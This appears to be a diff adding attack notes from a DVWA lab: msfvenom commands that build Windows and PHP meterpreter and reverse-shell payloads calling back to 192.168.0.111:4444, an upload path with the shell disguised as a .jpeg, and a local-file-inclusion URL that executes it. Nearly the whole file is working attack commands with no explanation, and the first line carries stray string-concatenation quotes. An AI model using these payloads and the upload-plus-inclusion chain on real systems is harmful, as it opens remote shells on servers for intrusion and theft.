@@ -1,0 +1,11 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f exe > shell.exe
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f raw > shell.php
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.111 LPORT=4444 -f raw > staged_shell.php
+
+msfvenom -p php/reverse_php LHOST=192.168.0.111 LPORT=4444 -f raw > shell_2.php
+
+C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg
+
+http://192.168.0.105/dvwa/vulnerabilities/fi/?page=file://C:/xampp/htdocs/dvwa/hackable/uploads/shell_2.php.jpeg
